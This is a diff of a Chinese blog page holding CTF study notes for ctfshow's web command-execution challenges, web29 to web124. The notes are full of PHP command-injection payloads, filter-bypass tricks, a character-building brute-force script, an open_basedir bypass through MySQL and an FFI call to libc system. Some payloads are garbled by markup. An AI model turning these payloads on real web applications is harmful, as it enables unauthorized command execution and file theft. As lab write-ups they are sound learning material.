@@ -23,22 +23,20 @@
   <meta name="description" content="努力">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfshow web命令执行">
-<meta property="og:url" content="http://na0hblog.top/2021/11/09/2021-11-09-ctfshow-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:url" content="http://na0hblog.top/2021/11/09/2021-11-09-ctfshowb%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="佩斯利小姐House">
 <meta property="og:description" content="努力">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo2.jpg">
-<meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo图片1.jpg">
 <meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo3.gif">
 <meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo5.gif">
 <meta property="article:published_time" content="2021-11-09T07:36:00.000Z">
-<meta property="article:modified_time" content="2021-11-09T08:04:55.431Z">
+<meta property="article:modified_time" content="2022-01-13T04:02:49.850Z">
 <meta property="article:author" content="lbj">
 <meta property="article:tag" content="学习笔记">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo2.jpg">
+<meta name="twitter:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo3.gif">
 
-<link rel="canonical" href="http://na0hblog.top/2021/11/09/2021-11-09-ctfshow-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+<link rel="canonical" href="http://na0hblog.top/2021/11/09/2021-11-09-ctfshowb%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
 
 <script id="page-configurations">
@@ -156,7 +154,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://na0hblog.top/2021/11/09/2021-11-09-ctfshow-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+    <link itemprop="mainEntityOfPage" href="http://na0hblog.top/2021/11/09/2021-11-09-ctfshowb%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -178,10 +176,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-11-09 15:36:00 / 修改时间：16:04:55" itemprop="dateCreated datePublished" datetime="2021-11-09T15:36:00+08:00">2021-11-09</time>
+              <time title="创建时间：2021-11-09 15:36:00" itemprop="dateCreated datePublished" datetime="2021-11-09T15:36:00+08:00">2021-11-09</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-13 12:02:49" itemprop="dateModified" datetime="2022-01-13T12:02:49+08:00">2022-01-13</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -204,11 +208,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <img src="D:\360MoveData\Users\浩土土\Desktop\hexo2.jpg" style="zoom:25%;" />
-
-<!-- more -->
-
-<img src="D:\360MoveData\Users\浩土土\Desktop\hexo图片1.jpg" alt="#沛宝小屋" style="zoom: 25%;" />
+        <!-- more -->
 
 <p>##<strong>想沛沛的第n天</strong></p>
 <p><strong>web29</strong><br>看正则表达式发现 flag被过滤 ls看看有什么<br>?c=system(ls); 发现有个flag.php<br>这题有多种方法 构造后查看源代码即可<br>1.可根据提示构造?c=echo <code>nl fl&#39;&#39;ag.php</code>; 2.c=system(‘cat fla); 3.?c=system(‘cp fla?.php 1.txt’)<br>*web30<br>看正则表达式 多过滤了 system和php 学会用反引号 ``有system()的作用<br>1.?c=echo <code>cat f* </code>; 2.提示的?c=echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>*web31<br>增加了一些绕过比较重要的是 cat和空格 在网上查看的可以替代cat的句式<br>1.tac：从最后一行开始显示，是cat的反向显示2.more：一页一页的显示档案内容3.less：与more类似4.head：查看文档的前几行5.tail：查看文档的后几行6.nl：显示的时候，顺便输入行号7.od：以二进制的方式读取档案8.vi：一种编辑器9.uniq：查看10.vim：一种编译器<br>可代替空格绕过的句式 1.${IFS}2.$IFS$13.${IFS4.%205.&lt;和&lt;&gt;重定向符6.%09   所以构造<br>?c=echo(<code>more%09f*</code>); 还有很多大佬解法?c=eval($_GET[1]);&amp;1=system(‘cat flag.php’);///嵌套脱离了c的正则判断<br>?c=echo<code>strings%09f*</code>;<br>还有hint的 ?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br>*web32<br>又过滤掉了； ( echo ‘ `( 分号可以用?&gt; eval可以用include  括号可以用“”代替 )<br>加上文件包含形式php：//filter/read=convert.base64-encode/resource=flag.php<br>这题构造：?c=include”$GET[1]”?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>*<strong>web33</strong><br>?c=include$GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php  和上题目一样但是要去掉双引号 因为被过滤<br>*<em><strong>web34 web35</strong></em><br>34过滤了：<br>35过滤了“ &lt; =<br> 都可以?c=include$GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>*<strong>web36</strong><br>36 过滤了数字?c=include$GET[hhp]?&gt;&amp;hhp=php://filter/read=convert.base64-encode/resource=flag.php 1改为数字<br>*<strong>web37</strong><br>37 eval函数变成了 include函数<br>考点为伪协议?c=data://text/ plain,<?php phpinfo();?><br>data后面将所有的数字、字符、字符串当做php代码执行<br>构造 ?c=data://text /  plain,<?php system('cat fl??.php');?><br>*<strong>web38</strong><br>38 过滤了php和file<br> 可以将<?php 改为<?= 于是构造为 ?c=data:/ / text/ plain,<?=system("cat fla?.???);?><br>*<strong>web39</strong><br>39过滤掉了flag 限制后缀为php 构造?c=data://text /p lain,<?php system("cat fla?.php");?><br>*<strong>web40</strong><br>?c=print_r(scandir(current(localeconv())));<br>print_r(scandir(xxx))可用来查看当前目录所有文件名  localeconv() 函数返回包括本地数字及货物格式信息的数组 current函数返回数组中的当前单元，默认第一个值，也可以用pos reset代替 然后发现flag.php是第三个数组 也是倒数第二个<br>于是构造 ?/c=highlight_file(next(array_reverse(scandir(current(localeconv())))));  可利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数.<br>array_reverse 以相反顺序返回数组 next 读取下一个元素 通过highlight_file读取 利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数.<br>*<strong>web41</strong><br>把所有的数字小写字母都屏蔽了 这种全过滤只有一种解法 构造字符串<br> &amp; 按位与 |按位或 ^ 按位异或 <del>取反 为四大位运算符，其中按位异 | 没有过滤<br>脚本如下：import re<br>import requests<br>url=”<a href="http://67e43a48-b511-4fcd-b715-74df05737fd1.challenge.ctf.show:8080&quot;">http://67e43a48-b511-4fcd-b715-74df05737fd1.challenge.ctf.show:8080&quot;</a><br>a=[]<br>ans1=””<br>ans2=””<br>for i in range(0,256):<br>    c=chr(i)<br>    tmp = re.match(r’[0-9]|[a-z]|^|+|\</del>|$|[|]|{|}|&amp;|-‘,c, re.I)<br>    if(tmp):<br>        continue<br>        #print(tmp.group(0))<br>    else:<br>        a.append(i)</p>
@@ -231,8 +231,15 @@ if ($fileInfo->isdir()) {
 ***web74**文件名换了 注意看呀！！！！
 ***web75** 先扫描目录  c=?>&lt;?php $a=new DirectoryIterator(“glob:///*”);foreach($a as $f){echo($f-&gt;toString().’ ‘);} exit(0); 发现是flag36.txt<br>然后发现又是open_basedir 限制 这时候可以mysql绕过<br>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’,<br>‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row)<br>{echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e-getMessage();exit(0);}exit(0);<br>*<strong>web76</strong>同75 改个文件名而已</p>
 <p>*<strong>web77</strong>要学会这题就要会新特性 ffi拓展 具体见 有了FFI以后，我们就可以直接在PHP脚本中调用C语言写的库中的函数了。<a target="_blank" rel="noopener" href="https://www.laruence.com/2020/03/11/5475.html">https://www.laruence.com/2020/03/11/5475.html</a><br>通过FFI（7.4版本）  c=$ffi=FFI::cdef(“int system(char <em>command);”, “libc.so.6”);//实施system$a=’/readflag &gt; 1.txt’;//放入文件$ffi-&gt;system($a);exit();  //再访问1.txt<br>readflag由读取根目录所有文件得来<br>c=$a=new DirectoryIterator(“glob:///</em>“);foreach($a as $f){echo($f-&gt;toString().’ ‘);}exit(0);</p>
-<p><em>web118<br>果然越来越刁了 需要脑洞啊 需要使用bash的内置变量进行绕过</em>*<br>$PWD<br>工作目录(你当前所在的目录)，这与内置命令 pwd 的作用相同：**<br>$PATH<br>可执行文件的搜索路径。<br>$IFS<br>内部域分隔符。这个变量用来决定 Bash 在解释字符串时如何识别域，或者单词边界。</p>
-<p>echo ${PWD:0:1}      #表示从0下标开始的第一个字符  echo ${PWD:<del>0:1}      #从结尾开始往前的第一个字符 所以这题 要构造 nl  就要 bin的最后一个 html的最后一个**<br>${PWD}          /var/www/html**<br>${PWD:</del>0}     l${PATH}         /bin**<br>${PATH:<del>0}    n     构造为${PATH:</del>A}${PWD:<del>A}$IFS????.???  ？是flag，php提示了<br><em><strong>web119</strong></em>*<br>把path也过滤掉了 那就用环境变量<br> 构造一个三 然后构造tac<br>环境变量如下：<br>php_cflags=-fstack-protector-strong -fpic -fpie -02 -D_largefile_source _d_file_offset_bi<br>php_version=7.3.22<br>shivl=1<br> ${php_version:$shlvl} 3.22  要取到”3” 就要数字1各种尝试 发现要取到3要这样构造 :${php_version:${php_version:</del>A}:<del>${SHLVL}这样为3 就可以用tac<br>tac=${PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:</del>A}:<del>${SHLVL}}:${PHP_VERSION:${PHP_VERSION:</del>A}:~${SHLVL}}}<br>加上空格？？？？.？？？</p>
+<p><em><strong>web118</strong></em><br>果然越来越刁了 需要脑洞啊 需要使用bash的内置变量进行绕过**<br>$PWD<br>工作目录(你当前所在的目录)，这与内置命令 pwd 的作用相同：**<br>$PATH<br>可执行文件的搜索路径。<br>$IFS<br>内部域分隔符。这个变量用来决定 Bash 在解释字符串时如何识别域，或者单词边界。</p>
+<p>echo ${PWD:0:1}      #表示从0下标开始的第一个字符  echo ${PWD:<del>0:1}      #从结尾开始往前的第一个字符 所以这题 要构造 nl  就要 bin的最后一个 html的最后一个**<br>${PWD}          /var/www/html**<br>${PWD:</del>0}     l${PATH}         /bin**<br>${PATH:<del>0}    n     构造为${PATH:</del>A}${PWD:<del>A}$IFS????.???  ？是flag，php提示了<br><em><strong>web119</strong></em><br>把path也过滤掉了 那就用环境变量<br> 构造一个三 然后构造tac<br>环境变量如下：<br>php_cflags=-fstack-protector-strong -fpic -fpie -02 -D_largefile_source _d_file_offset_bi<br>php_version=7.3.22<br>shivl=1<br> ${php_version:$shlvl} 3.22  要取到”3” 就要数字1各种尝试 发现要取到3要这样构造 :${php_version:${php_version:</del>A}:<del>${SHLVL}这样为3 就可以用tac<br>tac=${PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:</del>A}:<del>${SHLVL}}:${PHP_VERSION:${PHP_VERSION:</del>A}:~${SHLVL}}}<br>加上空格？？？？.？？？</p>
+<p><em><strong>web120</strong></em><br>根据php代码 有 system code 直接就 可以打开/bin/base64 flag.php  但是都被过滤了所以要构造<br>${PWD:${Z}:$井号SHLVL}} ====&gt; /<br>$井号RANDOM}  ====&gt; 随机会产生4或5位 多试几次 就是4<br>/bin/base64 flag.php<br>payload：${PWD::${井号SHLVL}}???${PWD::${井号SHLVL}}?????${井号RANDOM} ????.???</p>
+<p><em><strong>web121</strong></em></p>
+<p>shlvl被过滤了<br>方法1 可以用 ${井号井号}或者${井号?} 来代替 ${井号SHLVL} code=${PWD::${井号井号}}???${PWD::${井号井号}}?????${井号RANDOM} ????.???<br>方法2 使用/bin/rev逆序输出读文件 ifs定义字分隔字符 默认值：空格符 tab符 换行符 符号都是3 var/www/html 刚好地三个是r 可以匹配到/bin/rev<br>所以构造为 ${PWD::${井号?}}???${PWD::${井号??}${PWD:${井号IFS}:${井号?}}?? ????.???</p>
+<p><em><strong>web122</strong></em></p>
+<p>屏蔽了 pwd 用HOME绕过这个即可 $#就换成$?<br>执行命令前用&lt;A 使下一次$报错结果为1 #?获取上条命令执行后的返回值，0代表成功，非0代表失败，而且这个返回值是可控的<br>构造：code=&lt;A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???</p>
+<p><em><strong>web124</strong></em></p>
+<p>要知道这几个函数首先<br>base_convert(number,frombase,tobase) #在任意进制之间转化数字<br>dechex()把十进制数转换为十六进制数<br>hex2bin()把十六進制值的字符串转换为ascii字符<br>根据ascii编码 $hex2bin(“5f474554”) 这个就是 $_GET<br>base_convert(37907361743,10,36) hex2bin<br>dechex(1598506324) 5f474554<br>hex2bin(“5f474554”) _GET<br>所以构造无绕过的应该为<br>?c=$_GET<a href="$_GET%5Bb%5D">a</a>;&amp;a=system&amp;b=(“ls”)<br>所以payload: ?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&amp;abs=system&amp;acos=cat flag.php</p>
 
     </div>
 
@@ -327,7 +334,7 @@ if ($fileInfo->isdir()) {
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -363,7 +370,7 @@ if ($fileInfo->isdir()) {
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
